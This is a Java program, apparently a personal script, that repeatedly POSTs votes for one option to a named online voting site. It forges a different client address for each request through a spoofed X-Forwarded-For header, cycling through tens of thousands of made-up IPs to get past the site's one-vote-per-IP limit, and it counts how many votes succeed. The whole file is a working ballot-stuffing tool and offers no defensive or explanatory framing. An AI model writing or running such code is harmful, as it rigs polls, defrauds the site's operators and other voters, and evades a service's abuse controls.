package edu.zju.chwl.socket;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.*;
public class Vote {
public static void vote() throws IOException {   
        	
        String pre_ip="213.102.";
        int count=0;
        int max=244;
        for(int i=10;i<max;i++){
        	for(int j=12;j<max;j++){
        		String ip=pre_ip+i+"."+j;
        		URL url = new URL("http://toupiao.v0580.com/e/enews/index.php");//投票请求地址       
                URLConnection connection = url.openConnection();
            	connection.addRequestProperty("x-forwarded-for", ip);//伪造ip
                
                /**  
                 * 然后把连接设为输出模式。URLConnection通常作为输入来使用，比如下载一个Web页。  
                 * 通过把URLConnection设为输出，你可以把数据向你个Web页传送。下面是如何做：  
                 */  
                connection.setDoOutput(true);   
                /**  
                 * 最后，为了得到OutputStream，简单起见，把它约束在Writer并且放入POST信息中，例如： ...  
                 */  
                OutputStreamWriter out = new OutputStreamWriter(connection.getOutputStream(), "8859_1");   
                out.write("voteid=1&enews=AddVote&vote%5B%5D=21&submit=%E6%8A%95%E7%A5%A8"); //向页面传递数据，post的关键所在！   
                // remember to clean up   
                out.flush();   
                out.close();   
                
                //投票成功，打印信息。
                String sCurrentLine;   
                String sTotalString;   
                sCurrentLine = "";   
                sTotalString = "";   
                InputStream l_urlStream;   
                l_urlStream = connection.getInputStream();   
                // 传说中的三层包装阿！   
                BufferedReader l_reader = new BufferedReader(new InputStreamReader(   
                        l_urlStream));   
                while ((sCurrentLine = l_reader.readLine()) != null) {   
                    sTotalString += sCurrentLine + "\n";   
          
                }   
                //System.out.println(sTotalString);
                if(sTotalString.contains("感谢您的投票")){
                	count++;
                	System.out.println("ip:"+ip+" 投票成功！ 已为您投票次数："+count);
                }else{
                	System.out.println("ip:"+ip+" 已投票！不能重复投票！");
                }
        	}
        }  
           
    }   
  
    public static void main(String[] args) throws IOException {   
        vote();   
    }   
}